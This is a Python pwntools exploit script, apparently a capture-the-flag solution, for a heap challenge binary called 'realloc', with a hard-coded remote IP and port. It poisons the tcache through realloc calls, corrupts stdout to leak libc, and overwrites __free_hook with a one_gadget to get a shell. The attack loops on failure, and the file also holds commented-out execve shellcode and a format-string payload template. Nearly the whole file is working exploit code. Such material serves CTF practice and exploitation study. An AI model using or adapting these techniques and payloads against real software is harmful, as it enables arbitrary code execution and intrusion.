#coding=utf8
from pwn import *
from libformatstr import FormatStr
context.log_level = 'debug'
context(arch='amd64', os='linux')

local = 1
elf = ELF('./realloc')
if local:
    p = process('./realloc')
    libc = elf.libc
else:
    p = remote('116.85.48.105',5005)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# payload32 = fmtstr_payload(offset ，{xxx_got:system_addr})
# f = FormatStr(isx64=1)
# f[0x8048260]=0x45372800
# f[0x8048260+4]=0x7f20
# f.payload(7)
#shellcode = asm(shellcraft.sh())
#shellcode32 = '\x68\x01\x01\x01\x01\x81\x34\x24\x2e\x72\x69\x01\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\x6a\x0b\x58\xcd\x80' 
#shellcode64 = '\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x2e\x63\x68\x6f\x2e\x72\x69\x01\x48\x31\x04\x24\x48\x89\xe7\x31\xd2\x31\xf6\x6a\x3b\x58\x0f\x05'
#shellcode64 = '\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05'
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()

def debug(addr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr)))

def bk(addr):
    gdb.attach(p,"b *"+str(hex(addr)))

def pwn():
	def realloc(size,content):
		ru(">> ")
		sl('1')
		ru("Size?\n")
		sl(str(size))
		if size>0:
			ru("Content?\n")
			sd(content)
	def realloc2(size,content):
		ru(">> ")
		sl('1')
		ru("Size?")
		sl(str(size))
		if size>0:
			ru("Content?")
			sd(content)
	def ba():
		ru(">> ")
		sl('666')
	def free():
		ru(">> ")
		sl('2')

	realloc(0x50,'AAAA')
	realloc(0,'a')
	realloc(0x90,'BBBB')
	realloc(0,'a')
	realloc(0x20,'CCCC')
	realloc(0,'a')
	realloc(0x90,'bbbb')
	for i in range(7):
		free()
	realloc(0,'b')
	realloc(0x50,'AAAA')
	py = ''
	py += 'a'*0x50
	py += p64(0) + p64(0x71)
	py += p16(0x771d)
	realloc(0xe0,py)

	# debug(0)
	realloc(0,'n')
	realloc(0x90,'LLLL')
	realloc(0x0,'l')

	py = ''
	py += '\x00'*0x43 + p64(0xfbad1800) + p64(0)*3 + '\x00'
	realloc(0x90,py)

	rc(8)
	libc_base = u64(rc(8))-0x3ed8b0
	print "libc_base--->" + hex(libc_base)
	free_hook = libc_base + libc.sym["__free_hook"]
	one_gadget = libc_base + 0x4f322

	ba()

	py = ''
	py += 'a'*0x50
	py += p64(0) + p64(0x111)
	py += p64(free_hook)
	realloc2(0xf0,py)
	realloc2(0,'a')
	realloc2(0x68,'NNNN')
	realloc2(0x0,'k')
	realloc2(0x68,p64(one_gadget))
	free()
# pwn()
i = 0
while 1:
	i = i + 1
	print i
	try:
		pwn()
	except Exception as e:
		p.close()
		if local:
		    p = process('./realloc')
		    libc = elf.libc
		else:
		    p = remote('116.85.48.105',5005)
		    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
		continue
	else:
		sl('ls')
	
p.interactive()

# 0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   rcx == NULL

# 0x4f322 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a38c execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL